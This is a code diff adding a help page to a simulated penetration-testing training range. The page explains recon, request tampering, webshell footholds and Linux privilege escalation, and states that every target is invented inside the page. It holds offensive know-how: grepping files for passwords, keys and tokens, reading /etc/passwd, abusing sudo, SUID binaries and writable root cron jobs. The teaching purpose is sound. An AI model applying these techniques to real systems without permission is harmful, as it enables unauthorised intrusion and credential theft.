+      ls: 'Permissions and owners that differ from their neighbours: world-writable scripts, dotfiles, backups, a SUID bit. Long listings are where most escalation evidence starts.',
+      cat: 'A configuration value another part of the system trusts: a password, a signing key, an admin route, a database host. Note the file path as evidence.',
+      head: 'The first lines of a log or configuration: enough to identify the format and owner without reading everything.',
+      tail: 'The most recent lines of a log or history: what ran, as whom, and what failed.',
+      grep: 'The one matching line, not the whole file. Search for words such as pass, key, secret, admin or token, then read the surrounding line for context.',
+      find: 'A root-owned binary you can run with arguments, or a world-writable file a root job uses. A SUID bit alone is not a path; what the program does with its input is.',
+      ps: 'A process running as root that reads a file or script you can write, or a command line that names a configuration path.',
+      ss: 'A listener bound only to localhost: reachable from the box, not from the web range. That is the reason to be in the shell.',
+      env: 'Credentials, internal hostnames or debug flags in the environment of the web account.',
+      crontab: 'A schedule running as root that calls a script or reads a file your account can change. Compare the owner and mode of that file with your own rights.',
+      sudo: 'In sudo -l: a NOPASSWD entry, a permitted interpreter or package tool, or a command whose own options let it run something else. In sudo <cmd>: whether it really ran as root, proven by id.',
+      su: 'An authentication failure is information: the credential you tried does not belong to that account. Do not retry blindly.',
+      echo: 'A file your account can write and whose owner runs it later. The write itself proves nothing; the schedule running it does.',
+      exit: 'The prompt returning to the web range. If it does not, you are still inside the box session.',
+      logout: 'The prompt returning to the web range. If it does not, you are still inside the box session.'
+    };
+    const lookKey = value => String(value || '').toLowerCase().replace(/[^a-z0-9]+/g, ' ').trim().split(/\s+/)[0] || '';
+    const lookFor = value => {
+      const entry = LOOK[lookKey(value)];
+      const text = typeof entry === 'function' ? entry() : entry;
+      return text || DEFAULT_LOOK;
+    };
+    const cmdTable = rows => '<table class="tpg-switch-table"><thead><tr><th>Command</th><th>What it does to this target</th><th>Why an engagement uses it</th><th>What to look for here</th></tr></thead><tbody>' +
+      rows.map(row => '<tr><td><code>' + esc(row[0]) + '</code></td><td>' + esc(row[1]) + '</td><td>' + esc(row[2]) + '</td><td>' + esc(lookFor(row[0])) + '</td></tr>').join('') + '</tbody></table>';
+    const swTable = rows => '<table class="tpg-switch-table"><thead><tr><th>Switch</th><th>What it changes</th><th>When it matters</th></tr></thead><tbody>' +
+      rows.map(row => '<tr><td><code>' + esc(row[0]) + '</code></td><td>' + esc(row[1]) + '</td><td>' + esc(row[2]) + '</td></tr>').join('') + '</tbody></table>';
+    const sec = (title, lead, body) => '<details><summary><b>' + esc(title) + '</b>' +
+      (lead ? ' <span class="small mute">' + esc(lead) + '</span>' : '') + '</summary>' +
+      '<div style="padding:4px 0 12px">' + body + '</div></details>';
+
+    /* The next commands, in the order this state makes them useful. Each line is a suggestion the learner judges — never
+       the route, credential or escalation line itself, which stay behind hint and guide. */
+    const nextRows = (isRoot
+      ? [
+        ['id', 'Confirm the root shell instead of assuming it: the escalation is only proven by the account you are running as now.', 'The line the report quotes as escalation proof.'],
+        ['loot  ·  cat <the staff flag file>', 'loot lists what the floor has already yielded; the staff flag is the target’s own evidence of full compromise.', 'The engagement’s impact, in the target’s own artefact.'],
+        ['report', 'Every ticked objective becomes severity, evidence and a fix, including the setting that allowed the escalation.', 'The deliverable, written from the target’s real state.'],
+        ['next', 'Accepted only when every objective is ticked; it opens the next floor with fresh secrets.', 'A deeper surface rather than the same lesson again.'],
+        ['hint', 'If next refuses, status shows the open objective and hint names its one line.', 'The single step you are missing.']
+      ]
+      : shellOpen
+        ? [
+          ['id  ·  whoami  ·  groups', 'The account decides what every later command may read; group membership is often the whole path.', 'The rights you actually have.'],
+          ['ls -la  ·  find / -perm -4000 2>/dev/null', 'Modes and owners in the places that matter, then the programs that run with their owner’s rights.', 'What you may write, and what runs as someone else.'],
+          ['sudo -l', 'One command that lists everything the box delegates — and whether a password is needed.', 'A permitted command, or the proof that there is none.'],
+          ['ps  ·  ss  ·  crontab -l', 'What is running, as whom, what it listens on, and what runs on a schedule.', 'A root job or a local listener that web commands cannot reach.'],
+          ['cat <the file the listing pointed at>  ·  grep pass <file>', 'Read the configuration or history the listing flagged instead of dumping every file on the box.', 'A credential, a key, or the path the escalation needs.'],
+          ['id  ·  report', 'After the escalation: prove it, then write it. Typing alone never ticks an objective.', 'The evidence the report is built from.']
+        ]
+        : [
+          ['status  ·  hint', 'The objective in the target’s words, then one concrete line when a theory is ready to be confirmed.', 'What this floor is actually asking for.'],
+          ['targets  ·  nmap -sV <ip>', 'Scope first, then the banners that decide which family of flaw is worth testing.', 'A host and port list you can quote.'],
+          ['whatweb <url>  ·  nikto -h <host>', 'Fingerprint the stack, then the breadth-first pass that names files and headers without proving anything.', 'The stack, and the routes worth checking by hand.'],
+          ['gobuster dir -u <url>', 'Finds pages nothing links to. Read the status: 403 exists, 302 redirects to a sign-in, 404 does not exist.', 'A route the site never offered you.'],
+          ['curl -i <url>', 'Read one route properly: status, headers and body length. Then change one thing and send it again.', 'The request/response pair the report will quote.'],
+          ['curl -b "<cookie from the sign-in>" <route>', 'Carry the session the app handed you and ask for a resource that is not yours.', 'Whether the app checks ownership, not just sign-in.'],
+          ['unzip -l <downloaded file>  ·  strings <file>', 'A file the target hands you is evidence before it is a payload: the entries and printable strings are findings.', 'Configuration, keys and deploy notes you can use next.'],
+          ['shell', 'Once a foothold exists, this is the step that changes the prompt to the box itself.', 'Local commands instead of HTTP.']
+        ])
+      .concat(isRoot || (total && done >= total) ? [['report  ·  next', 'The write-up is the deliverable; next opens only once every objective is ticked.', 'A finished floor and a deeper one.']] : [])
+      .concat(prof.sqliLogin === false ? [['curl -s "<route the scan named>"', 'This sign-in is parameterised on purpose, so injection tools will say “not injectable”. The leak the scan names is the way in.', 'Staff credentials the site accepts at its own sign-in route.']] : [])
+      .concat(prof.openUsersApi ? [['curl -s "<api route from the scan>"', 'One API route answers without a session; compare it with and without a cookie.', 'An account list, and a field you were not meant to see.']] : [])
+      .concat(prof.openIdor ? [['curl -b "<your cookie>" "<object route>/<id you do not own>"', 'Authentication is checked but ownership is not; a different id is the whole test.', 'Someone else’s record, if the bug is really there.']] : [])
+      .concat(prof.robotsLeaksAdmin ? [['curl -s "<host>/robots.txt"', 'robots.txt is doing the hiding for the target; a disallowed route no page links to is the one to try.', 'A staff route a scan reports as 403 or 302.']] : []);
+    const nextTable = rows => '<table class="tpg-switch-table"><thead><tr><th>Command to try</th><th>Why this one next</th><th>What it opens up</th></tr></thead><tbody>' +
+      rows.map(row => '<tr><td><code>' + esc(row[0]) + '</code></td><td>' + esc(row[1]) + '</td><td>' + esc(row[2]) + '</td></tr>').join('') + '</tbody></table>';
+
+    const body = [
+      sec('Where you are', 'the target, the floor, and what this page will not tell you',
+        p('This engagement is <b>' + esc(brand) + '</b> at <code>' + esc(host) + '</code>' +
+          (ip ? ' (<code>' + esc(ip) + '</code>)' : '') + '. You are on floor ' + esc(String(floor)) +
+          (total ? ' with ' + esc(String(total)) + ' objective' + (total === 1 ? '' : 's') + ', ' + esc(String(done)) + ' ticked' : '') +
+          ', typing at ' + esc(session) + '.') +
+        p('Every host, account, secret, file and page behind it is invented inside this page. No socket is opened, no real site is contacted, and the page you imported is never changed.') +
+        p('<b>This page does not print the answer.</b> It explains what each command does here, why you would use it and what its switches change — not the path, credential, payload or flag for this floor. When you want the exact next line, <code>hint</code> gives one concrete step and <code>guide</code> gives the whole walkthrough; those are the deliberate answers, kept in the shell.')),
+
+      sec('What to look for on this floor', 'the evidence this engagement is built to leave',
+        (openObjective.text
+          ? p('<b>Start with the first open objective:</b> ' + esc(openObjective.text) + '. The command tables below say what evidence that step leaves; <code>hint</code> names one exact line when you are ready to confirm a theory.')
+          : p('<b>Every objective is ticked on this floor.</b> What is left is the write-up: <code>report</code> turns each ticked objective into evidence and a fix, and <code>next</code> opens the next floor with fresh secrets.')) +
+        ul([].concat(
+          shellOpen ? ['<b>You are already on the box.</b> The evidence is local now: <code>id</code>, <code>sudo -l</code>, file modes and schedules. Web commands still run, but the answers that matter are inside the shell.'] :
+            ['<b>You are at the web range.</b> Evidence is a request and its response: status, headers, body length and whether the answer changes when you change one thing.'],
+          isRoot ? ['<b>You are root.</b> What remains is proof: the flag file, the exact command that escalated, and a fix that removes the convenience setting rather than hiding it.'] : [],
+          prof.sqliLogin === false ? ['<b>This site’s sign-in is parameterised on purpose.</b> An injection tool will report “not injectable” — that is the correct answer here. Look for the configuration or credential file the scan names, then use those staff credentials on the site’s own sign-in route.'] : [],
+          prof.openUsersApi ? ['<b>One API route answers without a session.</b> Find it in a scan, compare it with and without a cookie, and note the field you were not meant to see.'] : [],
+          prof.openIdor ? ['<b>One object route checks authentication but not ownership.</b> A request for an id that is not yours answering 200 is the finding; an id you own proves nothing.'] : [],
+          prof.robotsLeaksAdmin ? ['<b>robots.txt is doing the hiding for you.</b> A route named there that no page links to is the one a scanner reports as 403 or 302.'] : [],
+          leaks.length ? ['<b>A readable file is part of this target’s story.</b> The scan names the kind of file; read it for credentials and configuration before trying to force an input.'] : [],
+          has('backup') ? ['<b>This floor adds an archive.</b> Its value is in the file list before the contents: configuration, signing keys and deploy notes are the usual entries.'] : [],
+          has('ssrf') ? ['<b>This floor adds a server-side fetch.</b> The signal is the server making a request you did not make, and the answer containing something only the server can reach.'] : [],
+          has('cmdi') ? ['<b>This floor adds command injection.</b> The signal is output from a second command inside a response that should only contain a network result.'] : [],
+          has('git') ? ['<b>This floor adds an exposed repository.</b> The signal is a path that answers with repository metadata instead of a page.'] : [],
+          has('ssh') ? ['<b>This floor adds SSH.</b> A password or key found in configuration is the entry; a refused connection on the published ports is not.'] : [],
+          ['<b>Across every command,</b> evidence is a request and response pair you can quote, with the command that produced it. A tool’s own claim (“injectable”, “vulnerable”) is a lead until you reproduce it by hand.']
+        ))),
+
+      sec('What to try next', 'an order to work in, and the commands that take each step',
+        (isRoot
+          ? p('You are root on the box, so the remaining steps are proof and paperwork, not exploitation.') +
+            ul([
+              '<b>Prove it.</b> <code>id</code> after the escalation is the difference between a claim and a finding; quote it beside the command that got you there.',
+              '<b>Capture the target’s own proof.</b> <code>loot</code> lists what the floor has yielded; the staff flag is the target’s evidence that the box is fully compromised.',
+              '<b>Write the finding.</b> <code>report</code> turns each ticked objective into severity, evidence and a fix — including the convenience setting that let you escalate.',
+              '<b>Move on when it is ticked.</b> <code>next</code> opens the next floor with fresh hosts and secrets.'
+            ])
+          : shellOpen
+            ? p('You have a shell, so the next steps are local. Work down the list and let each answer choose the next step.') +
+              ul([
+                '<b>Prove the session.</b> <code>id</code>, <code>whoami</code> and <code>hostname</code> before anything else: the account decides what every later command may see.',
+                '<b>Read what you can write.</b> <code>ls -la</code> in your home, the web root, <code>/opt</code> and <code>/tmp</code>. Permissions and owners are the escalation material.',
+                '<b>Ask what the box delegates.</b> <code>sudo -l</code> first, then <code>find / -perm -4000</code>: a permitted interpreter or package tool is a shell as its owner.',
+                '<b>Look at what runs by itself.</b> <code>ps</code>, <code>ss</code> and <code>crontab -l</code>: a root job reading a file you can write is a path, not a lottery.',
+                '<b>Escalate, then prove it.</b> <code>id</code> again after the step; a privilege claim without it is a guess.',
+                '<b>Write it down.</b> <code>note</code> and <code>loot</code> while it is fresh, and <code>report</code> once the floor is ticked.'
+              ])
+            : p('You are at the web range, so the next steps are recon, one proven observation, then access. Work down the list; each answer decides the next step.') +
+              ul([
+                '<b>Read the objective before the network.</b> <code>status</code> says what this floor wants; <code>hint</code> names one concrete line for the first open objective once a theory is ready to confirm.',
+                '<b>Map scope, then services.</b> <code>targets</code> lists the addresses, <code>nmap -sV</code> adds banners, <code>whatweb</code> describes the app. Do not test a technique the banners rule out.',
+                '<b>Find the route nothing links to.</b> <code>nikto</code> and <code>gobuster dir</code> produce a list, not a finding: 403 means it exists, 302 sends you to a sign-in, 404 is a dead end.',
+                '<b>Prove one thing by hand.</b> Two <code>curl -i</code> requests that differ in one parameter, cookie or method. That pair is the evidence; a tool saying “vulnerable” is only a lead.',
+                '<b>Turn evidence into access.</b> A session from the sign-in, a credential from a leaked configuration file, or an upload route that executes what it stores. <code>shell</code> opens the box once a foothold exists.',
+                '<b>Record as you go.</b> <code>note</code> and <code>loot</code> cost one line each and become the report; <code>exploit</code> checks a chain you have already written down, it does not start one.'
+              ])) +
+        p('<b>Commands to try next, in this order</b>') +
+        nextTable(nextRows) +
+        p('A step that answers nothing is still an answer: a route that does not exist, a scan that finds the same ports, a sign-in that refuses you. Move to the next step rather than repeating the same request with a different switch.')),
+
+      sec('How this shell reads a line', 'quotes, pipes, chains and switches',
+        p('The first word is the command; everything after it is what the command works on or how it should behave.') +
+        ul([
+          '<b>Quotes keep a value together.</b> A URL with a space or an ampersand belongs inside double quotes, or the shell reads the rest as a new command.',
+          '<b>A pipe <code>|</code></b> hands the output on its left to the command on its right, so <code>nmap … | grep open</code> filters the scan instead of reading a file.',
+          '<b>A double ampersand <code>&amp;&amp;</code></b> runs the second command only when the first one worked. This range runs both halves of a chain in order.',
+          '<b>A switch</b> starts with a dash and changes <i>how</i> a command works, never <i>what</i> it works on. <code>-v</code> and <code>-V</code> are different switches in most tools, so read the table for the tool you are using.',
+          'Words in angle brackets such as <code>&lt;host&gt;</code> are placeholders you replace; they are never typed literally.'
+        ]) +
+        p('A command that succeeds quietly still tells you something: the exit status is the shell’s short answer, and an empty result is evidence too.')),
+
+      sec('The range’s own commands', 'targeting, objectives, notes and the campaign',
+        p('These are not programs on the box. They belong to the simulated engagement and keep its targets, objectives, loot and notes. The shell’s <code>help</code> prints the one-screen version.') +
+        cmdTable([
+          ['help', 'One screen listing the range’s commands and what each is for.', 'A reminder when a name has slipped; this page is the long version.'],
+          ['status  ·  objectives', 'The objective list for this floor, with the ones the target has really reached ticked.', 'The definition of done. Nothing ticks by typing a command alone.'],
+          ['targets  ·  hosts', 'Every address in scope and the host the web app answers on.', 'Scope before scanning: an address that is not here answers nothing.'],
+          ['libraries', 'The offline pages and libraries this browser holds, each one a target you may attack.', 'In this range the thing you break into is material you already own.'],
+          ['target <n|slug|host>', 'Makes another library or fake site the target and rolls fresh secrets on the same floor.', 'Practise the same technique on a different target without changing floor.'],
+          ['map', 'The campaign ladder: what each deeper floor adds.', 'Decide whether to go deeper or repeat this floor.'],
+          ['depth  ·  rank', 'Which floor you are on, its tier and how many objectives it holds.', 'Keeps the difficulty in view.'],
+          ['hint', 'The next concrete command for the objective in front of you.', 'A deliberate answer when you are stuck — use it after you have formed a theory.'],
+          ['loot  ·  notes', 'The secrets and downloaded files collected so far, plus your own notes.', 'Your evidence bag: what can be reused and what belongs in the report.'],
+          ['note <text>', 'Adds a line to the engagement’s notes.', 'Write down what you observed and why it matters while it is fresh.'],
+          ['report  ·  findings  ·  vulns', 'Every ticked objective as a finding: severity, evidence and fix.', 'The deliverable a real engagement exists to produce.'],
+          ['exploit  ·  autopwn', 'Prints the whole chain for this floor, step by step.', 'A spoiler and a revision aid — try the chain by hand first.'],
+          ['next  ·  advance', 'Closes a floor only when every objective is ticked, then opens the next with new secrets.', 'Progress, not an escape from an unfinished objective.'],
+          ['reset-target', 'Rebuilds this floor with fresh hosts, secrets and flags.', 'Start the same lesson again without carrying the old answers.'],
+          ['reset-campaign', 'Returns to floor 1.', 'Back to the tutorial engagement.'],
+          ['clear', 'Clears the screen only; nothing about the engagement changes.', 'Tidy the transcript without losing state.'],
+          ['breach', 'Says you are already inside the engagement and lists the way out.', 'A reminder that exit leaves the range.']
+        ])),
+
+      sec('Recon: what is there, before anything is touched', 'nmap, whatweb, nikto, gobuster, DNS',
+        p('Recon produces evidence, not access. Each command answers one question; read the answer before choosing the next move. Notice the difference between a route that does not exist (404), one that exists and refuses you (403), and one that redirects (302) — that difference is the finding.') +
+        cmdTable([
+          ['nmap <ip|cidr>', 'Which addresses in this range answer, and which of the common ports are open.', 'Scope, and the first map of the target.'],
+          ['nmap -sV <ip>', 'The same scan with the service and version banner for every open port.', 'Banners decide which technique is even possible.'],
+          ['nmap -p- <ip>', 'Scans all 65535 ports instead of the usual set.', 'Finds a service a default scan leaves out.'],
+          ['nmap -sn <cidr>', 'A ping sweep: who answers, no port scan.', 'A fast map of the network.'],
+          ['nmap -Pn <ip>', 'Treats the host as up even when ping is filtered.', 'For a host that hides from ping but still serves traffic.'],
+          ['nmap --script <name> <ip>', 'Runs one simulated NSE script and prints its findings.', 'Turns a port list into specific things to test.'],
+          ['whatweb <url>', 'Server, language, framework, cookies, title and headers.', 'Tells you the stack, so you test the right family of flaws.'],
+          ['nikto -h <host>', 'A breadth-first pass of common web findings: exposed files, headers, routes.', 'Suggestions for where to look; not proof that a flaw is exploitable.'],
+          ['gobuster dir -u <url>', 'Tries a wordlist of paths and prints the status code for each.', 'Finds pages nothing links to. A 403 proves the route exists; a 302 sends you elsewhere.'],
+          ['ffuf  ·  dirb  ·  dirbuster', 'The same directory search under the other familiar names.', 'Practise with the tool you already know.'],
+          ['dig <name>  ·  host  ·  nslookup', 'Resolves a name inside the range to its address.', 'Confirms which host you are really talking about.'],
+          ['whois <domain>', 'The registration record for the range’s own domain.', 'Naming and ownership context; nothing outside the range answers.'],
+          ['searchsploit [term]', 'Searches the offline exploit index by product or version.', 'Connects a banner to public knowledge — read it critically.'],
+          ['msfconsole  ·  msf', 'A stub console: search lists modules and explains why the chain is taught by hand.', 'Tool familiarity without hiding the steps.'],
+          ['hydra  ·  medusa  ·  patator', 'Explains that the range has no password list and no rate limit to race.', 'A reminder that brute force is slow, noisy and rarely the first move.']
+        ]) +
+        p('<b>Switches of the recon tools</b>') +
+        swTable([
+          ['-sV', 'Adds version detection to a scan.', 'Before choosing an exploit family.'],
+          ['-p-  ·  -p <list>', 'All ports, or exactly the ports you name (for example -p 80,443).', 'Focus a scan, or widen one when the default result is thin.'],
+          ['--script <name>', 'Runs the named NSE check; the equals form --script=<name> works too.', 'Ask one specific question instead of scanning everything.'],
+          ['-sn  ·  -Pn', 'Ping only, or skip ping and assume the host is up.', 'Map a network, then scan a host that hides.'],
+          ['-oN <file>  ·  -oX <file>', 'Accepted for habit; this range prints its report on screen.', 'You will not find the file afterwards — copy the output if you need it.'],
+          ['dir -u <url> (gobuster)', 'Directory mode against one URL.', 'The only mode this simulated gobuster implements.'],
+          ['-h (nikto)', 'The host to check.', 'Nikto needs one; without it, it prints its usage.']
+        ])),
+
+      sec('Talking HTTP to the target', 'curl and wget: methods, headers, cookies, bodies',
+        p('<code>curl</code> is how a request becomes an observation: the status line, the headers and the body are all evidence. The range answers only for its own host; anything else fails as out of scope. A session the app hands back is a claim about who the next request is — test what that session may actually read.') +
+        cmdTable([
+          ['curl <url>', 'Sends one GET and prints the status line, headers and body.', 'The basic observation: what the app answers, and with which headers.'],
+          ['curl -I <url>  ·  --head', 'Headers only, no body.', 'Read status and headers quickly without a wall of HTML.'],
+          ['curl -X <method> <url>', 'Sends the method you name: GET, POST, PUT, DELETE.', 'Some routes behave differently per method, and that difference is a finding.'],
+          ['curl -d "a=1&b=2" <url>  ·  --data  ·  --data-raw', 'Sends a form body, which makes the request a POST.', 'Talk to a login or a search the way its own form does.'],
+          ['curl -b "name=value" <url>  ·  --cookie', 'Sends a cookie with the request.', 'Carry a session the app gave you and see what that session may read.'],
+          ['curl -H "Header: value" <url>', 'Sends one extra header, including Cookie or Authorization.', 'Test what the app trusts: a token, a role, a proxy header.'],
+          ['curl -o <file> <url>', 'Writes the body to a file in this shell and prints the transfer summary.', 'Keep evidence, then inspect or unpack it.'],
+          ['curl -s <url>  ·  --silent', 'Hides the progress meter and prints the body.', 'Useful when piping into grep or jq.'],
+          ['curl -F <field> <url>', 'Not supported here: this server has no multipart parser, so nothing is sent.', 'Read the tool’s own message for the upload form this target really takes.'],
+          ['wget <url>', 'Downloads the page to a file, with a realistic transfer transcript.', 'Same idea as curl -o, with wget’s output.'],
+          ['wget -O - <url>', 'Writes to standard output instead of a file.', 'Read a page without creating a file.']
+        ])),
+
+      sec('Files the target hands you', 'downloads, archives, strings and inspection',
+        p('Evidence is usually a file: an archive, a page, a token. These commands read it without changing the target.') +
+        cmdTable([
+          ['unzip -l <file>', 'Lists an archive’s entries and sizes without unpacking it.', 'See what is inside before you trust it.'],
+          ['unzip -p <file> <entry>', 'Prints one entry to the screen.', 'Read a file out of an archive without scattering files.'],
+          ['unzip <file>  ·  unzip -d <dir> <file>', 'Unpacks every entry, optionally into a folder.', 'Compare files, or hand them to other tools.'],
+          ['strings <file>', 'Prints the printable runs inside any file.', 'Secrets survive in binaries and archives; this is the quickest look.'],
+          ['base64 -d <data>', 'Decodes base64 back to its bytes.', 'Tokens and blobs are often only encoded, not encrypted.'],
+          ['xxd <file>', 'Shows bytes and their text side by side.', 'Spot a format, an encoding or a hidden string.'],
+          ['jq <filter> <file>', 'Reads JSON and prints the part you ask for.', 'Turn an API answer into the field that matters.'],
+          ['… | grep  ·  head  ·  tail  ·  cut  ·  sort  ·  uniq  ·  wc', 'Filters whatever the command on the left printed.', 'The range really pipes: these read the previous output, not a file with that name.']
+        ])),
+
+      sec('Tokens and hashes', 'what a hash and a JWT can and cannot tell you',
+        p('A hash is not a password and a token is not encryption. Both are claims: one about what a value was, the other about who a request says it is.') +
+        cmdTable([
+          ['john <hash>', 'Tries the range’s wordlist against a hash found on this target.', 'Shows why a fast unsalted hash of a weak password is not protection.'],
+          ['hashcat -m 0 <hash>', 'The same idea with hashcat’s output; -m 0 means raw MD5.', 'Recognising the mode is part of the skill.'],
+          ['jwt <token>', 'Decodes a JWT’s header and payload without verifying it.', 'Reading a token is not forging one: the signature is checked with a server-side key.'],
+          ['base64 -d <data>', 'Decodes an encoded blob.', 'Most “encrypted-looking” values are only encoded.']
+        ]) +
+        p('A value proves something only inside the system that made it: the same hash or token copied somewhere else proves nothing.')),
+
+      sec('A foothold: from a request to a shell', 'uploads, the webshell and what changes',
+        p('A foothold is a small amount of code running where the target runs it. The range models the common shape: an upload route that names the file in the request itself, then the server executing what it stored.') +
+        ul([
+          '<b>Find the upload route first.</b> A directory scan or a page form shows which route accepts a file; do not invent a route that was never offered.',
+          '<b>Match the extension to the stack you fingerprinted.</b> The server executes only what its own configuration treats as code.',
+          '<b>Upload, then request the uploaded file.</b> A successful upload is not a shell until the server runs it and returns its output.',
+          '<b><code>shell</code> opens the session</b> the uploaded file gives you. <code>exit</code> and <code>logout</code> drop back to the web range.',
+          '<b>Why it matters:</b> an upload directory that executes files is remote code execution by design. The report’s fix is to store uploads outside the document root and serve them as data.'
+        ]) +
+        p('The exact request for this target is what <code>hint</code> and the guide print. This page does not repeat it, because the transferable skill is recognising an upload route and reading the stack behind it.')),
+
+      sec('On the box: the shell’s commands', 'id, files, processes and privilege',
+        p('Once <code>shell</code> is open, the prompt belongs to the invented Linux host. Everything below acts on that fake box only.') +
+        cmdTable([
+          ['id  ·  whoami  ·  groups', 'The account and groups the session is running as.', 'Privilege starts here: who you are decides what you may read.'],
+          ['hostname  ·  uname -a', 'The machine’s name and kernel string.', 'Version and context, the same way banners work on the web side.'],
+          ['pwd  ·  cd <dir>  ·  ls -la [path]', 'Where you are and what is there, including hidden files and permissions.', 'Configuration, keys and backups hide in dotfiles.'],
+          ['cat <file>  ·  head  ·  tail', 'Reads a file, or the start or end of it.', 'The quickest way to read configuration and shell history.'],
+          ['grep <pattern> <file>', 'Prints only the lines that match.', 'Find a secret or a setting without reading everything.'],
+          ['find / -perm -4000 2>/dev/null', 'Lists SUID programs: files that run with their owner’s rights.', 'A classic escalation path. Read the owner before assuming anything.'],
+          ['ps  ·  ss', 'Processes and listening sockets on the box.', 'What is running, as whom, and what it listens on.'],
+          ['env  ·  cat /etc/passwd', 'Environment variables and local accounts.', 'Configuration leaks, and accounts with real shells.'],
+          ['crontab -l', 'Scheduled jobs for this account; system schedules live under /etc.', 'A root job running a file you can write is a path to root.'],
+          ['sudo -l', 'What this account may run as another user, and whether a password is needed.', 'The single most useful line of evidence on a box.'],
+          ['sudo <command>', 'Runs one permitted command as root.', 'Only what sudo -l allows — and the permitted tool decides the rest.'],
+          ['su  ·  su <user>', 'Switches user with a password.', 'Often fails without a credential from elsewhere.'],
+          ['echo … > <file>', 'Writes a line to a file you can write.', 'Planted input for a writable job or script.'],
+          ['exit  ·  logout', 'Leaves the shell and returns to the web range.', 'Do not lose the session by accident.'],
+          ['… | grep  ·  … | head', 'Filters the output of the command on its left, inside the shell too.', 'The same pipe rule as at the web prompt.']
+        ])),
+
+      sec('Privilege escalation is reading, not guessing', 'five families of misconfiguration',
+        p('Escalation is not a magic string: it is matching what the box lets you do to what runs with more rights than you have. The evidence comes from ordinary commands.') +
+        ul([
+          '<b>Group membership.</b> Some groups are root by design — a container runtime, an admin group, a log reader. Check <code>id</code> before anything else.',
+          '<b>Delegated commands.</b> <code>sudo -l</code> lists what you may run as another user, especially with <code>NOPASSWD</code>. A whole interpreter or package tool is effectively a shell as that user.',
+          '<b>Scheduled jobs.</b> A job that runs as root and reads a file or script your account can write is a path, not a lottery.',
+          '<b>SUID programs.</b> <code>find / -perm -4000</code> shows what runs with its owner’s rights; read what each program actually does with its arguments.',
+          '<b>Keys and history.</b> A readable private key, or a password left in a history file, is a credential — check who it belongs to and what it opens.'
+        ]) +
+        p('For each one ask: who runs this, with whose rights, and can my account change what it runs or reads? A path that needs a command you cannot run is not a path. The exact line for this floor is what <code>hint</code> eventually gives; work out the category first.') +
+        p('Never run an exploit you do not understand. Here the target is invented, which is exactly why it is safe to slow down and read.')),
+
+      sec('Objectives, evidence and the report', 'status, hint, loot, notes, report',
+        p('The engagement is finished by evidence, not by a feeling. Each objective ticks only when the target has really reached that state, and each one leaves something you can quote.') +
+        cmdTable([
+          ['status  ·  objectives', 'The floor’s objectives with ticks, plus the campaign depth.', 'The definition of done, at a glance.'],
+          ['hint', 'One concrete next command for the first open objective.', 'Unstick without reading the whole guide.'],
+          ['loot', 'Secrets and files this floor has yielded.', 'Evidence you can reuse and report.'],
+          ['note <text>', 'Adds a note that survives a target reset.', 'Your own record of what you saw and why it matters.'],
+          ['report', 'Each ticked objective as severity, evidence and fix.', 'The report is the deliverable of a real engagement.'],
+          ['next', 'Only when everything is ticked: closes this floor and opens the next.', 'Progress with fresh secrets each time.']
+        ])),
+
+      sec('Questions people ask here', 'short answers to the usual ones',
+        ul([
+          '<b>Why did a tool say “out of scope” or “no route to host”?</b> Only the hosts <code>targets</code> lists answer here. Everything else is a real network address this page refuses to touch.',
+          '<b>Why did SQL injection fail on this target?</b> Some targets are hardened on purpose: the login uses parameters, and the way in is a leaked configuration file the scan points at. A tool saying “not injectable” is a finding, not a bug.',
+          '<b>Why can’t I reach the internet?</b> The range has no sockets. Lookups, downloads and scans are answered inside the page from invented data.',
+          '<b>Does any of this touch my PC or my files?</b> The target changes nothing on your computer. Files a tool downloads are written into this shell’s own tree; the app’s files are not the target.',
+          '<b>Where are the flags?</b> The range’s own flag sits on the target’s staff material and pays the Cyber Desktop practice bank. This page will not print it.',
+          '<b>Why does a command I know from real Linux print something odd?</b> The box is a simulation: it implements the commands the lesson needs, and an unprogrammed command falls through to this shell’s bash so you are never blocked by “command not found”.',
+          '<b>How do I start over?</b> <code>reset-target</code> rebuilds this floor; <code>reset-campaign</code> goes back to floor 1; <code>breach end</code> or <code>exit</code> leaves the range.',
+          '<b>Where is the long help I had before?</b> The shell’s <code>help</code> is the one-screen list. This page is the long version for this target, and the Help window still has a page for every bash command and switch.'
+        ])),
+
+      sec('Scope, law and the habit', 'why the target is invented',
+        p('The target is a page you own, and every machine behind it is invented in memory. That is what makes it safe to practise the exact techniques that would be a crime against a system you do not own or have written permission to test.') +
+        p('The habit to take away is not the command. It is scope first, evidence before exploitation, the smallest action that proves the point, and a written finding with a fix. On a real engagement, stop at the first real proof and report it instead of going further.') +
+        p('The shell’s <code>guide</code> opens with the same rules, then walks one engagement end to end.'))
+    ].join('');
+
+    return { title: 'Target help · ' + brand, body };
+  }
+
   function openManual(topic, shellKey) {
     if (!manual) {
       const TP = window.TerminalPlayground;
@@ -4323,11 +5122,13 @@ DONE      When the range shows every objective ticked: type next to take the nex
         useExample: command => { if (inp) { inp.value = command; inp.focus(); } },
         shellChoices: manualChoices,
         allShells: manualAllShells,
-        pickShell: (key, topic) => openManual(topic || '', key)
+        pickShell: (key, topic) => openManual(topic || '', key),
+        targetGuide: () => targetGuidePage()
       });
     }
     if (!manual) return;
-    manual.open(manualFor(shellKey || 'moundshell'), 'sandbox', [], topic || '', null);
+    manual.open(manualFor(shellKey || 'moundshell'), 'sandbox', [], topic === 'target' ? '' : (topic || ''), null);
+    if (topic === 'target' && manual.target) manual.target();
   }
 
   /* A full screen view owns the whole screen. When the window itself is in fullscreen, anything outside that
@@ -4367,6 +5168,7 @@ DONE      When the range shows every objective ticked: type next to take the nex
       '<span class="small mute" style="flex:1;min-width:180px">bash, with this app as the only disk · your repositories live at <b>https://moundhub.com</b> — open the Browser and type that address, or run git here</span>' +
       '<label class="small mute" style="display:inline-flex;align-items:center;gap:3px" title="Colour of your own typing and the prompt in this shell"><input type="color" id="aeshellusercol" aria-label="Colour for your own commands in this shell" style="width:26px;height:22px;padding:0;border:1px solid var(--line);border-radius:5px;background:transparent;cursor:pointer"></label>' +
       '<button class="ib" id="aeshellhelp" title="Open the help window: every command, in the simplest words, with a playground inside it">❓ Help</button>' +
+      '<button class="ib" id="aeshelltargethelp" title="The target of the engagement you are in: every command you can use on it, what each one does there, why you would use it and its switches — no answers printed"' + (breach ? '' : ' hidden style="display:none"') + '>🎯 Target help</button>' +
       '<button class="ib" id="aeshellclear" title="Clear what is on screen only: mcode, an open breach range and everything you were doing stay exactly as they are">Clear</button>' +
       '<button class="ib" id="aeshellrestart" title="Restart moundshell: end this session, reload the app files and start a fresh shell (with the Cyber VM running this signs you in as kali@pentest)">⟲ Restart</button>' +
